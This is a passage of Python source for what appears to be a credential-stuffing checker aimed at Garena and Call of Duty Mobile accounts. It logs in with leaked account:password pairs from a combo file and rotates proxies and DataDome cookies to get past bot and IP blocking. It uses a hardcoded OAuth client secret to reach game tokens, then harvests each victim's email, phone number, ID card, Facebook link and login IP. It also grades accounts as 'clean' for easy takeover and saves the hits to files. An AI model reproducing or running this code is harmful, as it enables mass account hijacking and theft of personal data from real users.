                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua-platform': '"Android"',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-PH,en-US;q=0.9,en;q=0.8'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=30)
            if response.status_code == 403:
                proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session, stop_event=stop_event)
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                all_403 = True
                break
            if response.status_code == 429:
                time.sleep(3)
                continue
            response.raise_for_status()
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
            if 'error' in data:
                return (None, None, new_datadome)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return (None, None, new_datadome)
            return (v1, v2, new_datadome)
        except requests.exceptions.ConnectionError:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except requests.exceptions.Timeout:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                time.sleep(1)
                continue
    if all_403:
        return ('IP_BLOCKED', None, None)
    return (None, None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
    if cookie_header:
        headers['cookie'] = cookie_header
    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(k, v, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
    return None

def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'sec-ch-ua-mobile': '?1', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'}
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'}
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'}
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {'codm_nickname': user_data.get('codm_nickname', 'N/A'), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'), 'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'), 'email_verified': bool(user_info.get('email_v', 0)), 'email_verified_time': user_info.get('email_verified_time', 0), 'email_verify_available': bool(user_info.get('email_verify_available', False)), 'security': {'password_strength': user_info.get('password_s', 'N/A'), 'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)), 'authenticator_app': bool(user_info.get('authenticator_enable', 0)), 'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)), 'facebook_account': user_info.get('fb_account', None), 'suspicious': bool(user_info.get('suspicious', False))}, 'personal': {'real_name': user_info.get('realname', 'N/A'), 'id_card': user_info.get('idcard', 'N/A'), 'id_card_length': user_info.get('idcard_length', 'N/A'), 'country': user_info.get('acc_country', 'N/A'), 'country_code': user_info.get('country_code', 'N/A'), 'mobile_no': user_info.get('mobile_no', 'N/A'), 'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound', 'extra_data': user_info.get('realinfo_extra_data', {})}, 'profile': {'avatar': user_info.get('avatar', 'N/A'), 'signature': user_info.get('signature', 'N/A'), 'shell_balance': user_info.get('shell', 0)}, 'status': {'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive', 'whitelistable': bool(user_info.get('whitelistable', False)), 'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))}, 'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid}, 'binds': [], 'game_info': []}
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    from rich.table import Table
    from rich.panel import Panel
    from rich.box import ROUNDED, HEAVY
    from rich.console import Console
    from rich.text import Text
    from rich import box
    console = Console()
    if details is None:
        table = Table(show_header=False, box=ROUNDED, border_style="red", padding=(0, 2), expand=False)
        table.add_column(style="dim", width=12)
        table.add_column(style="bright_white")
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Reason", f"[red]{error_reason or 'Incorrect Password'}[/red]")
        console.print(Panel(table, title="[red]✖ INVALID[/red]", border_style="red", box=HEAVY, padding=(0, 1)))
        return
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    username = details.get('username', 'N/A')
    mobile = details['personal'].get('mobile_no', 'N/A')
    country_code = details['personal'].get('country_code', 'N/A')
    shell = details['profile'].get('shell_balance', 0)
    is_clean = details.get('is_clean', False)
    formatted_mobile = format_mobile_number(mobile, country_code)
    if email and email != 'N/A' and ('@' in email):
        email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
    else:
        email_display = 'N/A'
    fb_username = details['facebook']['fb_username']
    fb_uid = details['facebook']['fb_uid']
    fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
    if fb_uid == 'N/A' or not fb_uid:
        fb_info = 'NOT CONNECTED'
        fb_username = 'N/A'
        fb_link = 'N/A'
    elif not fb_username or fb_username == 'N/A':
        fb_info = 'FB UNBIND or FB DELETED'
        fb_username = 'N/A'
    else:
        fb_info = 'CONNECTED'
    login_history = details.get('login_history', [])
    last_login_info = login_history[0] if login_history else {}
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
    last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
    last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
    last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
    other_games = [g for g in game_connections or [] if g.get('game', '').upper() != 'CODM']
    shell_color = "yellow" if int(shell or 0) > 0 else "dim"
    if has_codm and codm_info:
        border_color = "green" if is_clean else "yellow"
        title = f"[bold {border_color}]✨ CLEAN[/bold {border_color}]" if is_clean else f"[bold {border_color}]⊘ NOT CLEAN[/bold {border_color}]"
        table = Table(show_header=False, box=ROUNDED, border_style=border_color, padding=(0, 2), expand=False)
        table.add_column(style="dim", width=14)
        table.add_column(style="bright_white")
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Username", username)
        table.add_row("Shell", f"[{shell_color}]{shell}[/{shell_color}]")
        table.add_row("Email", email_display)
        table.add_row("Mobile", str(formatted_mobile))
        table.add_row("Facebook", fb_info)
        table.add_row("", "")
        table.add_row("CODM Level", f"[cyan]{codm_info.get('codm_level', 'N/A')}[/cyan]")
        table.add_row("Server", f"[cyan]{codm_info.get('region', 'N/A')}[/cyan]")
        table.add_row("IGN", f"[cyan]{codm_info.get('codm_nickname', 'N/A')}[/cyan]")
        table.add_row("CODM UID", f"[cyan]{codm_info.get('uid', 'N/A')}[/cyan]")
        table.add_row("", "")
        table.add_row("Last Login", f"[dim]{last_login_date}[/dim]")
        table.add_row("Login From", f"[dim]{last_login_where}[/dim]")
        table.add_row("Login IP", f"[dim]{last_login_ip}[/dim]")
        table.add_row("Country", f"[dim]{last_login_country}[/dim]")
        if other_games:
            table.add_row("", "")
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                table.add_row(f"{gname} [{greg}]" if greg else gname, f"[magenta]{grole}[/magenta]")
        table.add_row("", "")
        table.add_row("Status", f"[bold {border_color}]{'Clean' if is_clean else 'Not Clean'}[/bold {border_color}]")
        console.print(Panel(table, title=title, border_style=border_color, box=HEAVY, padding=(0, 1)))
    else:
        border_color = "magenta" if other_games else "cyan"
        gnames = ' / '.join((g.get('game', '?') for g in other_games)) if other_games else ''
        title = f"[bold {border_color}]◆ NO CODM ({gnames})[/bold {border_color}]" if other_games else f"[bold {border_color}]○ NO CODM[/bold {border_color}]"
        table = Table(show_header=False, box=ROUNDED, border_style=border_color, padding=(0, 2), expand=False)
        table.add_column(style="dim", width=14)
        table.add_column(style="bright_white")
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Username", username)
        table.add_row("Shell", f"[{shell_color}]{shell}[/{shell_color}]")
        table.add_row("Email", email_display)
        table.add_row("Mobile", str(formatted_mobile))
        table.add_row("Facebook", fb_info)
        table.add_row("", "")
        table.add_row("CODM", "[red]NO CODM ACCOUNT[/red]")
        table.add_row("", "")
        table.add_row("Last Login", f"[dim]{last_login_date}[/dim]")
        table.add_row("Login From", f"[dim]{last_login_where}[/dim]")
        table.add_row("Login IP", f"[dim]{last_login_ip}[/dim]")
        table.add_row("Country", f"[dim]{last_login_country}[/dim]")
        if other_games:
            table.add_row("", "")
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                table.add_row(f"{gname} [{greg}]" if greg else gname, f"[magenta]{grole}[/magenta]")
        table.add_row("", "")
        table.add_row("Status", f"[bold {border_color}]{'Clean' if is_clean else 'Not Clean'}[/bold {border_color}]")
        console.print(Panel(table, title=title, border_style=border_color, box=HEAVY, padding=(0, 1)))

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections)

_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS',
               '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV',
               '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE',
               '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS',
               '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE',
                    '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS',
                    '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Pragma': 'no-cache', 'Accept': '*/*',
                        'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                       'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs,
                                       json={'token': access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                         'Accept': 'application/json, text/plain, */*',
                         'Referer': f'https://{base_domain}/?app={app_id}',
                         'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id},
                                        headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({
                    'region': region.upper(),
                    'game': game_name,
                    'role': str(role),
                    'app_id': app_id
                })
    except Exception as e:
        logger.error(f'[ERROR] get_game_connections failed: {e}')
    return game_info

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        logger.error(f'[ERROR] save_game_folder: {e}')

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None, stop_event=None):
    max_retries = 15
    attempt = 0
    def _display(acc, pwd, det, codm, has, err=None, gc=None):
        if not suppress_print:
            (display_codm_info_elegant if use_elegant_display else display_codm_info)(acc, pwd, det, codm, has, err, gc)
    while True:
        attempt += 1
        if stop_event and stop_event.is_set():
            return 'STOPPED'
        try:
            session.cookies.clear()
            init_ga_cookies(session)
